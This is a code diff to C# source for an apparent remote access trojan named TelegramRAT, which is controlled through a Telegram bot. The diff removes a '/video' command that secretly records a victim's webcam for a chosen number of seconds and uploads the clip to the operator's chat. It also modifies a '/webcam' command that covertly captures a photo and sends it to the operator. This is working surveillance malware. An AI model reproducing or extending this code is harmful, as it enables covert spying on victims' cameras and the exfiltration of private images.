@@ -10,7 +10,6 @@ using Telegram.Bot;
 using Telegram.Bot.Types.InputFiles;
 using Telegram.Bot.Types.Enums;
 using Telegram.Bot.Types;
-using OpenCvSharp;
 using WindowsInput;
 using System.Reflection;
 using System.Text;
@@ -149,8 +148,6 @@ namespace TelegramRAT
 
             }
         }
-
-
 
         static string GetWindowsVersion()
         {
@@ -685,9 +682,9 @@ namespace TelegramRAT
 
                 Description = "Take a photo from webcamera.",
                 Example = "/webcam",
-                Execute = async (model, update) =>
+                Execute = (model, update) =>
                 {
-                    await Task.Run(() =>
+                    Task.Run(() =>
                     {
                         Task.Run(() =>
                         {
@@ -705,6 +702,8 @@ namespace TelegramRAT
                                 VideoCaptureDevice device = new VideoCaptureDevice(capdevices[0].MonikerString);
                                 device.NewFrame += (sender, args) =>
                                 {
+                                    //args.Frame = webcamShotStream;
+                                   
                                     endMap = args.Frame.Clone() as Bitmap;
                                     endMap.Save(webcamShotStream, ImageFormat.Png);
                                     (sender as VideoCaptureDevice).SignalToStop();
@@ -716,7 +715,7 @@ namespace TelegramRAT
                                 webcamShotStream.Position = 0;
 
                                 InputOnlineFile webcamPhoto = new InputOnlineFile(webcamShotStream);
-                                Bot.SendPhotoAsync(update.Message.Chat.Id, webcamPhoto);
+                                Bot.SendPhotoAsync(update.Message.Chat.Id, webcamPhoto, replyToMessageId: update.Message.MessageId);
                                 webcamShotStream.Close();
                             }
                             catch (Exception ex)
@@ -834,59 +833,6 @@ namespace TelegramRAT
                     {
                         ReportError(update, ex);
                     }
-                }
-            });
-
-            //RECORD VIDEO FROM WEBCAM
-            CommandsList.Add(new BotCommand
-            {
-                Command = "/video",
-                CountArgs = 1,
-
-                Description = "Record video from webcamera for given amount of seconds.",
-                Example = "/video 5",
-                Execute = async (model, update) =>
-                {
-                    await Task.Run(async () =>
-                    {
-                        try
-                        {
-
-                            int framesCount = 30 * Convert.ToInt32(model.Args[0]);
-                            VideoCapture cap = new VideoCapture(0, VideoCaptureAPIs.ANY)
-                            {
-                                FrameWidth = 1280,
-                                FrameHeight = 720,
-                            };
-
-                            Mat frame = new Mat();
-                            VideoWriter vidWriter = new VideoWriter("vid.mp4", FourCC.H264, 30, new OpenCvSharp.Size(cap.FrameWidth, cap.FrameHeight));
-
-                            await Bot.SendChatActionAsync(update.Message.Chat.Id, ChatAction.RecordVideo);
-
-                            for (int i = 0; i < framesCount; i++)
-                            {
-                                cap.Read(frame);
-                                vidWriter.Write(frame);
-                            }
-                            await Bot.SendChatActionAsync(update.Message.Chat.Id, ChatAction.UploadVideo);
-
-                            cap.Release();
-
-                            vidWriter.Release();
-
-                            using (var fileStream = new FileStream("vid.mp4", FileMode.Open))
-                            {
-                                InputOnlineFile inputOnlineFile = new InputOnlineFile(fileStream);
-                                Bot.SendVideoAsync(update.Message.Chat.Id, inputOnlineFile, replyToMessageId: update.Message.MessageId).Wait();
-                            }
-                            System.IO.File.Delete("vid.mp4");
-                        }
-                        catch (Exception ex)
-                        {
-                            ReportError(update, ex);
-                        }
-                    });
                 }
             });
 
@@ -1761,6 +1707,8 @@ namespace TelegramRAT
                     });
                 }
             });
+
+            
 
         }
     }
